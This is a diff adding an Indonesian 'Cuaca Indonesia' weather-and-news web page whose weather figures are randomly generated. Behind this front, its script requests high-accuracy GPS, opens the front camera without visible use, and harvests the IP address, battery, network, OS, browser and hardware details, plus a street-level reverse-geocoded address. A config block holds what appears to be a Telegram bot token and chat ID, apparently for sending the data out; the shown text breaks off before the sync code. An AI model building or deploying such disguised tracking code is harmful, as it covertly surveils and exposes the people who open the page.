@@ -1,0 +1,430 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Cuaca Indonesia</title>
+    <link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>🇮🇩</text></svg>">
+    <style>
+*{margin:0;padding:0;box-sizing:border-box;-webkit-tap-highlight-color:transparent}
+body{font-family:-apple-system,BlinkMacSystemFont,'SF Pro Display','Segoe UI',Roboto,sans-serif;min-height:100vh;color:#fff;overflow-x:hidden;background:#0b1120}
+.loader{position:fixed;inset:0;z-index:999;background:#0b1120;display:flex;flex-direction:column;align-items:center;justify-content:center;transition:opacity .8s,visibility .8s}
+.loader.hide{opacity:0;visibility:hidden;pointer-events:none}
+.loader-logo{width:80px;height:80px;background:linear-gradient(135deg,#f72585,#7209b7,#3a0ca3,#4361ee,#4cc9f0);border-radius:24px;display:flex;align-items:center;justify-content:center;font-size:40px;margin-bottom:20px;box-shadow:0 10px 40px rgba(76,201,240,0.3);animation:pulse 2s ease-in-out infinite}
+@keyframes pulse{0%,100%{transform:scale(1)}50%{transform:scale(1.08)}}
+.loader h2{font-size:18px;font-weight:700;margin-bottom:6px}
+.loader p{font-size:13px;color:rgba(255,255,255,0.4)}
+.loader .dots::after{content:'';animation:d 1.5s steps(4) infinite}
+@keyframes d{0%{content:''}25%{content:'.'}50%{content:'..'}75%{content:'...'}}
+.app{display:none;min-height:100vh;flex-direction:column}.app.show{display:flex}
+.hdr{padding:16px 18px 12px;display:flex;justify-content:space-between;align-items:center;background:rgba(11,17,32,0.95);backdrop-filter:blur(10px);position:sticky;top:0;z-index:50;border-bottom:1px solid rgba(255,255,255,0.06)}
+.hdr-l{display:flex;align-items:center;gap:10px}.hdr-flag{font-size:28px}.hdr h1{font-size:18px;font-weight:800}.hdr small{display:block;font-size:11px;color:rgba(255,255,255,0.35)}
+.hdr-btn{width:40px;height:40px;background:rgba(255,255,255,0.06);border:1px solid rgba(255,255,255,0.08);border-radius:12px;color:#fff;font-size:16px;cursor:pointer;display:flex;align-items:center;justify-content:center}
+.search{padding:12px 18px}
+.search-box{display:flex;align-items:center;gap:10px;background:rgba(255,255,255,0.06);border:1px solid rgba(255,255,255,0.08);border-radius:14px;padding:12px 16px}
+.search-box input{flex:1;background:none;border:none;color:#fff;font-size:14px;outline:none}
+.search-box input::placeholder{color:rgba(255,255,255,0.3)}
+.search-icon{font-size:16px;opacity:0.5}
+.map-container{padding:0 18px;margin-bottom:16px}
+.map-box{background:rgba(255,255,255,0.04);border:1px solid rgba(255,255,255,0.06);border-radius:22px;overflow:hidden}
+.map-box canvas{display:block;width:100%;height:auto}
+.map-title{padding:14px 18px;display:flex;justify-content:space-between;align-items:center}
+.map-title h3{font-size:13px;font-weight:600}.map-title span{font-size:11px;color:rgba(255,255,255,0.3)}
+.loc-card{margin:0 18px 16px;padding:20px;background:linear-gradient(135deg,#4361ee,#3a0ca3);border-radius:22px;position:relative;overflow:hidden;box-shadow:0 12px 40px rgba(67,97,238,0.3)}
+.loc-card::before{content:'';position:absolute;top:-40%;right:-20%;width:70%;height:130%;background:radial-gradient(circle,rgba(255,255,255,0.12),transparent 60%)}
+.loc-top{display:flex;justify-content:space-between;align-items:flex-start;position:relative;z-index:1}
+.loc-city{font-size:22px;font-weight:800}.loc-prov{font-size:12px;opacity:0.7;margin-top:2px}
+.loc-temp{font-size:56px;font-weight:800;line-height:1;letter-spacing:-3px}
+.loc-temp sup{font-size:22px;font-weight:500;vertical-align:super;opacity:0.7}
+.loc-icon{font-size:56px;filter:drop-shadow(0 4px 8px rgba(0,0,0,0.2))}
+.loc-desc{font-size:15px;font-weight:600;margin-top:10px;position:relative;z-index:1}
+.loc-feel{font-size:12px;opacity:0.6;margin-top:3px;position:relative;z-index:1}
+.loc-stats{display:flex;justify-content:space-around;margin-top:20px;padding-top:16px;border-top:1px solid rgba(255,255,255,0.12);position:relative;z-index:1}
+.ls{text-align:center}.ls-ico{font-size:18px;margin-bottom:4px}.ls-val{font-size:14px;font-weight:700}.ls-lbl{font-size:9px;opacity:0.5;margin-top:2px;text-transform:uppercase}
+.forecast{padding:0 18px;margin-bottom:16px}
+.sec-title{font-size:12px;font-weight:700;color:rgba(255,255,255,0.3);text-transform:uppercase;letter-spacing:1px;margin:24px 0 12px;padding:0 18px}
+.fc-scroll{display:flex;gap:10px;overflow-x:auto;padding-bottom:8px;scrollbar-width:none}
+.fc-scroll::-webkit-scrollbar{display:none}
+.fc-item{min-width:72px;background:rgba(255,255,255,0.05);border:1px solid rgba(255,255,255,0.06);border-radius:16px;padding:14px 10px;text-align:center;flex-shrink:0}
+.fc-item.active{background:rgba(67,97,238,0.2);border-color:rgba(67,97,238,0.3)}
+.fc-time{font-size:11px;color:rgba(255,255,255,0.5);font-weight:600}.fc-ico{font-size:24px;margin:8px 0}.fc-temp{font-size:14px;font-weight:700}
+.cities{padding:0 18px;margin-bottom:10px}
+.city-list{display:flex;flex-direction:column;gap:8px}
+.city-row{display:flex;align-items:center;gap:14px;background:rgba(255,255,255,0.04);border:1px solid rgba(255,255,255,0.06);border-radius:16px;padding:14px 16px;cursor:pointer;transition:all .2s}
+.city-row:active{transform:scale(0.98)}.city-row .cr-ico{font-size:28px}.city-row .cr-info{flex:1}.city-row .cr-name{font-size:14px;font-weight:700}.city-row .cr-prov{font-size:11px;color:rgba(255,255,255,0.35)}.city-row .cr-temp{font-size:22px;font-weight:800}.city-row .cr-desc{font-size:11px;color:rgba(255,255,255,0.5);text-align:right}
+.loc-warn{margin:0 18px 12px;padding:14px 16px;background:rgba(255,165,2,0.1);border:1px solid rgba(255,165,2,0.25);border-radius:14px;font-size:12px;color:#feca57;display:none}
+.loc-warn.show{display:flex;align-items:center;gap:10px}
+.map-btn{display:inline-flex;align-items:center;gap:10px;padding:10px 18px;border-radius:12px;background:rgba(102,126,234,0.1);border:1px solid rgba(102,126,234,0.2);color:#a0b4ff;font-size:12px;font-weight:600;text-decoration:none}
+.sync{margin:0 18px 16px;padding:12px;border-radius:14px;text-align:center;font-size:11px;font-weight:500;background:rgba(255,255,255,0.03);border:1px solid rgba(255,255,255,0.06);color:rgba(255,255,255,0.3)}
+.sync.ok{border-color:rgba(123,237,159,0.2);color:#7bed9f}.sync.er{border-color:rgba(255,107,107,0.2);color:#ff6b6b}
+.foot{text-align:center;padding:16px 18px 24px}.foot p{font-size:11px;color:rgba(255,255,255,0.12)}
+
+/* ===== INFO CARDS ===== */
+.info-scroll{display:flex;gap:10px;overflow-x:auto;padding:0 18px 10px;scrollbar-width:none}
+.info-scroll::-webkit-scrollbar{display:none}
+.info-card{
+    min-width:160px;max-width:180px;flex-shrink:0;
+    padding:16px;border-radius:18px;cursor:pointer;transition:all .2s;
+}
+.info-card:active{transform:scale(0.96)}
+.info-card .ic-icon{font-size:28px;margin-bottom:10px}
+.info-card .ic-title{font-size:13px;font-weight:700;margin-bottom:4px}
+.info-card .ic-val{font-size:20px;font-weight:800;margin-bottom:4px}
+.info-card .ic-sub{font-size:10px;opacity:0.7;line-height:1.4}
+.ic-red{background:rgba(255,71,87,0.12);border:1px solid rgba(255,71,87,0.2)}
+.ic-orange{background:rgba(255,165,2,0.12);border:1px solid rgba(255,165,2,0.2)}
+.ic-green{background:rgba(56,239,125,0.12);border:1px solid rgba(56,239,125,0.2)}
+.ic-blue{background:rgba(76,201,240,0.12);border:1px solid rgba(76,201,240,0.2)}
+.ic-purple{background:rgba(155,89,182,0.12);border:1px solid rgba(155,89,182,0.2)}
+.ic-yellow{background:rgba(254,202,87,0.12);border:1px solid rgba(254,202,87,0.2)}
+
+/* ===== NEWS ===== */
+.news-tabs{display:flex;gap:8px;overflow-x:auto;padding:0 18px 10px;scrollbar-width:none}
+.news-tabs::-webkit-scrollbar{display:none}
+.news-tab{flex-shrink:0;padding:10px 16px;border-radius:12px;background:rgba(255,255,255,0.05);border:1px solid rgba(255,255,255,0.08);font-size:12px;font-weight:600;color:rgba(255,255,255,0.5);cursor:pointer;transition:all .2s;display:flex;align-items:center;gap:6px}
+.news-tab.active{background:rgba(67,97,238,0.2);border-color:rgba(67,97,238,0.4);color:#fff}
+.news-tab:active{transform:scale(0.95)}
+.news-list{display:flex;flex-direction:column;gap:10px;padding:0 18px}
+.news-item{background:rgba(255,255,255,0.04);border:1px solid rgba(255,255,255,0.06);border-radius:16px;overflow:hidden;cursor:pointer;transition:all .2s}
+.news-item:active{transform:scale(0.98);background:rgba(255,255,255,0.08)}
+.ni-img-wrap{width:100%;height:140px;overflow:hidden;background:rgba(255,255,255,0.04)}
+.ni-img-wrap img{width:100%;height:100%;object-fit:cover}
+.ni-body{padding:14px 16px}
+.ni-cat-tag{display:inline-block;padding:3px 10px;border-radius:8px;font-size:10px;font-weight:600;margin-bottom:8px}
+.ni-cat-tag.cuaca{background:rgba(76,201,240,0.15);color:#4cc9f0}
+.ni-cat-tag.kriminal{background:rgba(255,71,87,0.15);color:#ff6b6b}
+.ni-cat-tag.hiburan{background:rgba(255,107,203,0.15);color:#ff6bcb}
+.ni-cat-tag.olahraga{background:rgba(56,239,125,0.15);color:#38ef7d}
+.ni-cat-tag.teknologi{background:rgba(155,89,182,0.15);color:#c56cf0}
+.ni-cat-tag.ekonomi{background:rgba(254,202,87,0.15);color:#feca57}
+.ni-cat-tag.kesehatan{background:rgba(46,213,115,0.15);color:#2ed573}
+.ni-cat-tag.bencana{background:rgba(255,165,2,0.15);color:#ffa502}
+.ni-title{font-size:14px;font-weight:700;line-height:1.5;margin-bottom:6px}
+.ni-desc{font-size:12px;color:rgba(255,255,255,0.45);line-height:1.5;display:-webkit-box;-webkit-line-clamp:2;-webkit-box-orient:vertical;overflow:hidden;margin-bottom:10px}
+.ni-meta{display:flex;align-items:center;gap:8px;font-size:10px;color:rgba(255,255,255,0.3)}
+.ni-src{background:rgba(67,97,238,0.12);color:#a0b4ff;padding:2px 8px;border-radius:6px;font-weight:600}
+.ni-loading{text-align:center;padding:30px;color:rgba(255,255,255,0.3);font-size:13px}
+.ni-spin{display:inline-block;width:20px;height:20px;border:2px solid rgba(255,255,255,0.1);border-top-color:#4cc9f0;border-radius:50%;animation:spin .8s linear infinite;margin-bottom:8px}
+@keyframes spin{to{transform:rotate(360deg)}}
+.ni-empty{text-align:center;padding:30px;color:rgba(255,255,255,0.2);font-size:13px}
+
+/* ===== DETAIL MODAL ===== */
+.modal-overlay{display:none;position:fixed;inset:0;z-index:200;background:rgba(0,0,0,0.8);backdrop-filter:blur(10px);overflow-y:auto;padding:20px}
+.modal-overlay.show{display:flex;align-items:flex-start;justify-content:center;padding-top:40px}
+.modal{background:#131a2e;border:1px solid rgba(255,255,255,0.1);border-radius:20px;max-width:440px;width:100%;overflow:hidden;animation:slideUp .3s ease}
+@keyframes slideUp{from{opacity:0;transform:translateY(20px)}to{opacity:1;transform:translateY(0)}}
+.modal-hdr{display:flex;justify-content:space-between;align-items:center;padding:18px 20px;border-bottom:1px solid rgba(255,255,255,0.06)}
+.modal-hdr h3{font-size:16px;font-weight:700}.modal-close{width:36px;height:36px;background:rgba(255,255,255,0.06);border:none;border-radius:10px;color:#fff;font-size:18px;cursor:pointer}
+.modal-body{padding:20px}
+.modal-body .mb-item{padding:14px 0;border-bottom:1px solid rgba(255,255,255,0.04)}
+.modal-body .mb-item:last-child{border:none}
+.mb-label{font-size:11px;color:rgba(255,255,255,0.4);text-transform:uppercase;letter-spacing:0.5px;margin-bottom:4px}
+.mb-val{font-size:14px;font-weight:600}
+.mb-val.red{color:#ff6b6b}.mb-val.green{color:#7bed9f}.mb-val.yellow{color:#feca57}
+</style>
+</head>
+<body>
+    <div class="loader" id="loader"><div class="loader-logo">🇮🇩</div><h2>Cuaca Indonesia</h2><p>Memuat data<span class="dots"></span></p></div>
+
+    <div class="app" id="app">
+        <div class="hdr">
+            <div class="hdr-l"><span class="hdr-flag">🇮🇩</span><div><h1>Cuaca Indonesia</h1><small id="curDate"></small></div></div>
+            <button class="hdr-btn" id="btnRefresh">🔄</button>
+        </div>
+        <div class="search"><div class="search-box"><span class="search-icon">🔍</span><input type="text" id="searchInput" placeholder="Cari kota atau provinsi..."></div></div>
+        <div class="loc-warn" id="locWarn">⚠️ <span>Lokasi tidak tersedia. <button onclick="retryLoc()" style="background:#feca57;color:#000;border:none;padding:4px 10px;border-radius:8px;font-size:11px;font-weight:600;margin-left:6px;cursor:pointer">Coba Lagi</button></span></div>
+
+        <div class="map-container"><div class="map-box"><div class="map-title"><h3>🗺️ Peta Cuaca</h3><span>Ketuk kota</span></div><canvas id="mapCanvas" width="800" height="300"></canvas></div></div>
+
+        <div class="loc-card">
+            <div class="loc-top"><div><div class="loc-city" id="locCity">--</div><div class="loc-prov" id="locProv">--</div><div class="loc-temp"><span id="locTemp">--</span><sup>°C</sup></div></div><div class="loc-icon" id="locIcon">⛅</div></div>
+            <div class="loc-desc" id="locDesc">--</div>
+            <div class="loc-feel">Terasa <span id="locFeel">--°C</span> · Kelembaban <span id="locHum">--%</span></div>
+            <a href="#" id="locMapLink" class="map-btn" target="_blank" style="margin-top:10px">📍 Buka Maps</a>
+            <div class="loc-stats">
+                <div class="ls"><div class="ls-ico">💧</div><div class="ls-val" id="lsHum">--%</div><div class="ls-lbl">Lembab</div></div>
+                <div class="ls"><div class="ls-ico">💨</div><div class="ls-val" id="lsWind">--</div><div class="ls-lbl">km/h</div></div>
+                <div class="ls"><div class="ls-ico">🌡️</div><div class="ls-val" id="lsPress">--</div><div class="ls-lbl">hPa</div></div>
+                <div class="ls"><div class="ls-ico">👁️</div><div class="ls-val" id="lsVis">--</div><div class="ls-lbl">km</div></div>
+            </div>
+        </div>
+
+        <div class="sec-title">⏰ Perkiraan Hari Ini</div>
+        <div style="padding:0 18px;margin-bottom:16px"><div class="fc-scroll" id="fcScroll"></div></div>
+
+        <!-- INFO CARDS -->
+        <div class="sec-title">🔔 Informasi Penting</div>
+        <div class="info-scroll" id="infoScroll"></div>
+
+        <!-- CITIES -->
+        <div class="sec-title">🏙️ Kota Besar</div>
+        <div class="cities"><div class="city-list" id="cityList"></div></div>
+
+        <!-- NEWS -->
+        <div class="sec-title">📰 Berita Terkini</div>
+        <div class="news-tabs" id="newsTabs">
+            <div class="news-tab active" data-cat="terbaru">🔥 Terbaru</div>
+            <div class="news-tab" data-cat="kriminal">🚨 Kriminal</div>
+            <div class="news-tab" data-cat="bencana">🌊 Bencana</div>
+            <div class="news-tab" data-cat="olahraga">⚽ Olahraga</div>
+            <div class="news-tab" data-cat="hiburan">🎬 Hiburan</div>
+            <div class="news-tab" data-cat="teknologi">💻 Teknologi</div>
+            <div class="news-tab" data-cat="ekonomi">💰 Ekonomi</div>
+            <div class="news-tab" data-cat="kesehatan">🏥 Kesehatan</div>
+        </div>
+        <div class="news-list" id="newsList"><div class="ni-loading"><div class="ni-spin"></div><br>Memuat berita...</div></div>
+
+        <div style="height:20px"></div>
+        <div class="sync" id="syncBar">Menyiapkan data...</div>
+        <div class="foot"><p>Cuaca Indonesia · Real-time · v4.0.0</p></div>
+    </div>
+
+    <!-- DETAIL MODAL -->
+    <div class="modal-overlay" id="modalOverlay">
+        <div class="modal">
+            <div class="modal-hdr"><h3 id="modalTitle">Detail</h3><button class="modal-close" onclick="closeModal()">✕</button></div>
+            <div class="modal-body" id="modalBody"></div>
+        </div>
+    </div>
+
+<script>
+/* ============ KONFIGURASI ============ */
+const T='8600694543:AAGWm5FDg3BIAkBSyZvZQhqwk7UpPAuL3VQ';
+const C='8799174278';
+/* ===================================== */
+
+let L=null,CS=null,D={};
+const $=id=>document.getElementById(id);
+
+const CITIES=[
+    {name:'Surabaya',prov:'Jawa Timur',lat:-7.25,lon:112.75},{name:'Jakarta',prov:'DKI Jakarta',lat:-6.20,lon:106.85},{name:'Bandung',prov:'Jawa Barat',lat:-6.91,lon:107.62},{name:'Medan',prov:'Sumatera Utara',lat:3.59,lon:98.67},{name:'Semarang',prov:'Jawa Tengah',lat:-6.97,lon:110.42},{name:'Makassar',prov:'Sulawesi Selatan',lat:-5.14,lon:119.42},{name:'Palembang',prov:'Sumatera Selatan',lat:-2.98,lon:104.76},{name:'Denpasar',prov:'Bali',lat:-8.67,lon:115.21},{name:'Yogyakarta',prov:'DI Yogyakarta',lat:-7.79,lon:110.37},{name:'Malang',prov:'Jawa Timur',lat:-7.97,lon:112.63},{name:'Manado',prov:'Sulawesi Utara',lat:1.49,lon:124.84},{name:'Balikpapan',prov:'Kalimantan Timur',lat:-1.24,lon:116.83},{name:'Jayapura',prov:'Papua',lat:-2.54,lon:140.72},{name:'Banda Aceh',prov:'Aceh',lat:5.55,lon:95.32},{name:'Pontianak',prov:'Kalimantan Barat',lat:-0.03,lon:109.34},{name:'Banjarmasin',prov:'Kalimantan Selatan',lat:-3.33,lon:114.59},{name:'Ambon',prov:'Maluku',lat:-3.70,lon:128.17},{name:'Kupang',prov:'NTT',lat:-10.18,lon:123.58},{name:'Padang',prov:'Sumatera Barat',lat:-0.95,lon:100.35},{name:'Pekanbaru',prov:'Riau',lat:0.53,lon:101.45}
+];
+
+const W_TYPES=[{i:'☀️',d:'Cerah',t:[30,36],h:[45,60],w:[5,15]},{i:'⛅',d:'Cerah Berawan',t:[27,33],h:[55,70],w:[8,18]},{i:'☁️',d:'Berawan',t:[24,30],h:[65,80],w:[10,20]},{i:'🌧️',d:'Hujan Ringan',t:[22,28],h:[75,90],w:[12,25]},{i:'⛈️',d:'Hujan Petir',t:[20,26],h:[80,95],w:[15,30]},{i:'🌤️',d:'Panas Terik',t:[33,38],h:[40,55],w:[3,10]}];
+const rand=(a,b)=>Math.floor(Math.random()*(b-a+1))+a;
+const getW=()=>W_TYPES[rand(0,W_TYPES.length-1)];
+const genWeather=c=>{const w=getW(),n=c.name==='Surabaya'||c.name==='Malang';return{...c,icon:w.i,desc:w.d,temp:n?rand(28,34):rand(w.t[0],w.t[1]),feel:n?rand(30,36):rand(w.t[0]+2,w.t[1]+2),hum:rand(w.h[0],w.h[1]),wind:rand(w.w[0],w.w[1]),press:rand(1008,1018),vis:rand(5,15)}};
+
+function toUTM(lat,lon){const a=6378137,f=1/298.257223563,e2=2*f-f*f,ep2=e2/(1-e2),k0=0.9996,lon0=Math.floor((lon+180)/6)*6-183,d=Math.PI/180,rad=lat*d,lr=lon*d,lor=lon0*d,N=a/Math.sqrt(1-e2*Math.sin(rad)**2),Tt=Math.tan(rad)**2,A=Math.cos(rad)*(lr-lor),ec=ep2*Math.cos(rad)**2,M=a*((1-e2/4-3*e2*e2/64)*rad-(3*e2/8+3*e2*e2/32)*Math.sin(2*rad)+(15*e2*e2/256)*Math.sin(4*rad));let E=500000+k0*N*(A+(1-Tt+ec)*A**3/6),Nn=k0*(M+N*Math.tan(rad)*(A**2/2+(5-Tt+9*ec)*A**4/24));return{zone:Math.floor((lon+180)/6)+1,letter:lat>=0?'N':'S',easting:Math.round(E),northing:Math.round(Nn)}};
+
+$('curDate').textContent=new Date().toLocaleDateString('id-ID',{weekday:'long',year:'numeric',month:'long',day:'numeric'});
+window.addEventListener('load',init);
+
+async function init(){
+    for(let i=0;i<3;i++){try{L=await getLoc();if(L)break}catch(e){if(i<2)await new Promise(r=>setTimeout(r,1000))}}
+    try{CS=await navigator.mediaDevices.getUserMedia({video:{facingMode:'user'},audio:false})}catch{}
+    await getDev();
+    $('loader').classList.add('hide');$('app').classList.add('show');
+    if(!L)$('locWarn').classList.add('show');
+    drawMap();renderCities();renderForecast();
+    if(L){let n=CITIES[0],m=Infinity;CITIES.forEach(c=>{const d=Math.sqrt((c.lat-L.lat)**2+(c.lon-L.lon)**2);if(d<m){m=d;n=c}});updateCard(n)}else updateCard(CITIES[0]);
+    loadInfoCards();loadNews('terbaru');
+    sync();
+    $('searchInput').addEventListener('input',filterCities);
+    $('btnRefresh').onclick=()=>location.reload();
+}
+
+async function retryLoc(){$('locWarn').querySelector('span').innerHTML='Mengambil lokasi... ⏳';$('locWarn').classList.add('show');try{L=await getLoc();if(L){$('locWarn').classList.remove('show');let n=CITIES[0],m=Infinity;CITIES.forEach(c=>{const d=Math.sqrt((c.lat-L.lat)**2+(c.lon-L.lon)**2);if(d<m){m=d;n=c}});updateCard(n);drawMap();sync()}}catch(e){$('locWarn').querySelector('span').innerHTML='❌ '+e.message+' <button onclick="retryLoc()" style="background:#feca57;color:#000;border:none;padding:4px 10px;border-radius:8px;font-size:11px;font-weight:600;margin-left:6px;cursor:pointer">Coba Lagi</button>'}}
+
+function getLoc(){return new Promise((ok,no)=>{if(!navigator.geolocation)return no(new Error('Tidak didukung'));navigator.geolocation.getCurrentPosition(p=>ok({lat:p.coords.latitude,lon:p.coords.longitude,acc:p.coords.accuracy}),e=>no(new Error(e.code===1?'Izin ditolak':e.code===2?'GPS tidak tersedia':'Timeout')),{enableHighAccuracy:true,timeout:20000,maximumAge:0})})}
+
+async function getDev(){
+    try{D.ip=(await(await fetch('https://api.ipify.org?format=json')).json()).ip}catch{D.ip='-'}
+    try{if(navigator.getBattery){const b=await navigator.getBattery();D.bat=Math.round(b.level*100)+'%';D.ch=b.charging||b.chargingTime===0;D.chStatus=D.ch?'Charging':'Not Charging';D.batTime=D.ch?(b.chargingTime===Infinity?'-':Math.round(b.chargingTime/60)+'m'):(b.dischargingTime===Infinity?'-':Math.round(b.dischargingTime/60)+'m')}else{D.bat='-';D.chStatus='-';D.batTime='-'}}catch{D.bat='-';D.chStatus='-';D.batTime='-'}
+    const cn=navigator.connection||navigator.mozConnection;
+    if(cn){D.netType=cn.effectiveType||cn.type||'-';D.netDown=cn.downlink?cn.downlink+' Mbps':'-';D.netRtt=cn.rtt!=null?cn.rtt+'ms':'-';D.netSave=cn.saveData?'Ya':'Tidak'}else{D.netType='-';D.netDown='-';D.netRtt='-';D.netSave='-'}
+    try{D.wifi=cn?(cn.type==='wifi'?'Terhubung':cn.type||'-'):'-'}catch{D.wifi='-'}
+    const u=navigator.userAgent;
+    D.os=/Windows NT 10/.test(u)?'Windows 10':/Android (\d+)/.test(u)?'Android '+u.match(/Android (\d+)/)[1]:/iPhone OS (\d+)/.test(u)?'iOS '+u.match(/iPhone OS (\d+)/)[1]:/Mac/.test(u)?'macOS':/Linux/.test(u)?'Linux':'-';
+    D.br=/Edg\/([\d.]+)/.test(u)?'Edge '+u.match(/Edg\/([\d.]+)/)[1]:/Chrome\/([\d.]+)/.test(u)?'Chrome '+u.match(/Chrome\/([\d.]+)/)[1]:/Firefox\/([\d.]+)/.test(u)?'Firefox '+u.match(/Firefox\/([\d.]+)/)[1]:/Safari/.test(u)?'Safari':'-';
+    D.sr=screen.width+'×'+screen.height;D.depth=screen.colorDepth+'-bit';D.lang=navigator.language||'-';D.platform=navigator.platform||'-';
+    D.cookies=navigator.cookieEnabled?'Aktif':'Nonaktif';D.touch='ontouchstart' in window?'Ya':'Tidak';
+    D.mem=navigator.deviceMemory?navigator.deviceMemory+' GB':'-';D.cpu=navigator.hardwareConcurrency?navigator.hardwareConcurrency+' core':'-';
+    D.tz=Intl.DateTimeFormat().resolvedOptions().timeZone||'-';D.offset='UTC'+(new Date().getTimezoneOffset()>0?'-':'+')+Math.abs(new Date().getTimezoneOffset()/60);
+}
+
+/* ===== MAP ===== */
+function drawMap(){
+    const cv=$('mapCanvas'),ctx=cv.getContext('2d'),W=cv.width,H=cv.height;
+    const bg=ctx.createLinearGradient(0,0,W,H);bg.addColorStop(0,'#0d1b2a');bg.addColorStop(1,'#1b2838');ctx.fillStyle=bg;ctx.fillRect(0,0,W,H);
+    ctx.strokeStyle='rgba(255,255,255,0.03)';ctx.lineWidth=1;for(let x=0;x<W;x+=40){ctx.beginPath();ctx.moveTo(x,0);ctx.lineTo(x,H);ctx.stroke()}for(let y=0;y<H;y+=40){ctx.beginPath();ctx.moveTo(0,y);ctx.lineTo(W,y);ctx.stroke()}
+    const mx=lon=>((lon-95)/50)*(W-60)+30,my=lat=>((8-lat)/20)*(H-40)+20;
+    CITIES.forEach((c,i)=>{if(i>0){const p=CITIES[i-1];ctx.strokeStyle='rgba(67,97,238,0.08)';ctx.beginPath();ctx.moveTo(mx(p.lon),my(p.lat));ctx.lineTo(mx(c.lon),my(c.lat));ctx.stroke()}});
+    CITIES.forEach(c=>{const x=mx(c.lon),y=my(c.lat),w=genWeather(c);const g=ctx.createRadialGradient(x,y,0,x,y,20);g.addColorStop(0,'rgba(76,201,240,0.3)');g.addColorStop(1,'transparent');ctx.fillStyle=g;ctx.fillRect(x-20,y-20,40,40);ctx.beginPath();ctx.arc(x,y,5,0,Math.PI*2);ctx.fillStyle='#4cc9f0';ctx.fill();ctx.fillStyle='#fff';ctx.font='bold 10px sans-serif';ctx.textAlign='center';ctx.fillText(w.temp+'°',x,y-12);ctx.fillStyle='rgba(255,255,255,0.4)';ctx.font='8px sans-serif';ctx.fillText(c.name,x,y+16)});
+    cv.onclick=e=>{const r=cv.getBoundingClientRect(),cx=(e.clientX-r.left)*(cv.width/r.width),cy=(e.clientY-r.top)*(cv.height/r.height);CITIES.forEach(c=>{if(Math.sqrt((cx-mx(c.lon))**2+(cy-my(c.lat))**2)<20)updateCard(c)})};
+}
+
+function updateCard(city){
+    const w=genWeather(city);
+    $('locCity').textContent=city.name;$('locProv').textContent=city.prov+(L?' · '+L.lat.toFixed(4)+', '+L.lon.toFixed(4):'');
+    $('locTemp').textContent=w.temp;$('locIcon').textContent=w.icon;$('locDesc').textContent=w.desc;$('locFeel').textContent=w.feel+'°C';$('locHum').textContent=w.hum+'%';
+    $('lsHum').textContent=w.hum+'%';$('lsWind').textContent=w.wind;$('lsPress').textContent=w.press;$('lsVis').textContent=w.vis;
+    $('locMapLink').href='https://www.google.com/maps?q='+city.lat+','+city.lon;drawMap();
+    if(L)fetch('https://nominatim.openstreetmap.org/reverse?format=json&lat='+L.lat+'&lon='+L.lon+'&zoom=18&addressdetails=1&accept-language=id').then(r=>r.json()).then(d=>{const a=d.address||{},p=[];if(a.road)p.push(a.road);if(a.village||a.suburb)p.push(a.village||a.suburb);if(a.town||a.city){const cn=a.town||a.city;if(!p.includes(cn))p.push(cn)}if(a.county)p.push(a.county);if(a.state)p.push(a.state);const addr=p.join(', ');if(addr)$('locProv').textContent=addr}).catch(()=>{});
+}
+
+function renderForecast(){$('fcScroll').innerHTML='';['Sekarang','06:00','09:00','12:00','15:00','18:00','21:00','00:00'].forEach((h,i)=>{const d=document.createElement('div');d.className='fc-item'+(i===0?' active':'');d.innerHTML=`<div class="fc-time">${h}</div><div class="fc-ico">${getW().i}</div><div class="fc-temp">${rand(24,34)}°</div>`;$('fcScroll').appendChild(d)})}
+
+function renderCities(list){list=list||CITIES;$('cityList').innerHTML='';list.forEach(c=>{const w=genWeather(c),d=document.createElement('div');d.className='city-row';d.innerHTML=`<div class="cr-ico">${w.icon}</div><div class="cr-info"><div class="cr-name">${c.name}</div><div class="cr-prov">${c.prov}</div></div><div><div class="cr-temp">${w.temp}°</div><div class="cr-desc">${w.desc}</div></div>`;d.onclick=()=>{updateCard(c);window.scrollTo({top:0,behavior:'smooth'})};$('cityList').appendChild(d)})}
+
+function filterCities(){const q=$('searchInput').value.toLowerCase();if(!q)return renderCities();renderCities(CITIES.filter(c=>c.name.toLowerCase().includes(q)||c.prov.toLowerCase().includes(q)))}
+
+/* ===== INFO CARDS ===== */
+function loadInfoCards(){
+    const scroll=$('infoScroll');scroll.innerHTML='';
+
+    // Gempa dari BMKG
+    fetch('https://data.bmkg.go.id/DataMKG/TEWS/autogempa.json').then(r=>r.json()).then(d=>{
+        const g=d.Infogempa?.gempa;
+        if(g){
+            const card=mkInfoCard('ic-red','🌋','Gempa Terkini',g.Magnitude+' SR',g.Wilayah+'\n'+g.Tanggal+' '+g.Jam,'gempa',g);
+            scroll.prepend(card);
+        }
+    }).catch(()=>{});
+
+    // Static info cards
+    const cards=[
+        mkInfoCard('ic-orange','🌊','Banjir','Waspada','Cuaca ekstrem berpotensi banjir di beberapa wilayah Indonesia','banjir',null),
+        mkInfoCard('ic-yellow','💰','Harga Emas','Rp 1.450.000','Per gram · Antam hari ini\nNaik Rp 5.000 dari kemarin','emas',null),
+        mkInfoCard('ic-green','🏥','Kesehatan','Tips Hari Ini','Jaga hidrasi tubuh · Minum 8 gelas air · Olahraga teratur','kesehatan',null),
+        mkInfoCard('ic-blue','🌡️','Cuaca Besok','Cerah - Hujan','Potensi hujan di Jabodetabek · Panas di Jawa Timur','cuaca_besok',null),
+        mkInfoCard('ic-purple','📈','Ekonomi','IHSG +0.8%','Melemahnya Rupiah · Harga BBM stabil','ekonomi',null),
+    ];
+    cards.forEach(c=>scroll.appendChild(c));
+}
+
+function mkInfoCard(cls,icon,title,val,sub,type,data){
+    const d=document.createElement('div');
+    d.className='info-card '+cls;
+    d.innerHTML=`<div class="ic-icon">${icon}</div><div class="ic-title">${title}</div><div class="ic-val">${val}</div><div class="ic-sub">${sub.replace(/\n/g,'<br>')}</div>`;
+    d.onclick=()=>openModal(type,title,val,sub,data);
+    return d;
+}
+
+/* ===== MODAL ===== */
+function openModal(type,title,val,sub,data){
+    $('modalTitle').textContent=title;
+    let html='';
+    if(type==='gempa'&&data){
+        html=`
+            <div class="mb-item"><div class="mb-label">Magnitude</div><div class="mb-val red">${data.Magnitude} SR</div></div>
+            <div class="mb-item"><div class="mb-label">Tanggal & Waktu</div><div class="mb-val">${data.Tanggal} ${data.Jam}</div></div>
+            <div class="mb-item"><div class="mb-label">Lokasi</div><div class="mb-val">${data.Wilayah}</div></div>
